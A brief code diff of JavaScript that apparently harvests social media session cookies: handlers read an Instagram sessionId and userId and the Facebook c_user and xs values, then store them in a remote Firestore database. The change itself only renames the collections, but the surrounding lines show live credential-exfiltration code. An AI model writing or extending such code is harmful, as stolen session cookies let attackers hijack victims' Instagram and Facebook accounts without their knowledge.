@@ -36,7 +36,7 @@ async function handleInstagram() {
     const userInfo = await fetchIGUserInfo(sessionId, userId);
 
     try {
-      await addDoc(collection(db, "sessionid"), {
+      await addDoc(collection(db, "instagram"), {
         platform: "Instagram",
         sessionId,
         userId,
@@ -105,7 +105,7 @@ async function handleFacebook() {
     }
 
     try {
-      await addDoc(collection(db, "sessionid"), {
+      await addDoc(collection(db, "facebook"), {
         platform: "Facebook",
         c_user: cUser.value,
         xs: xs.value,
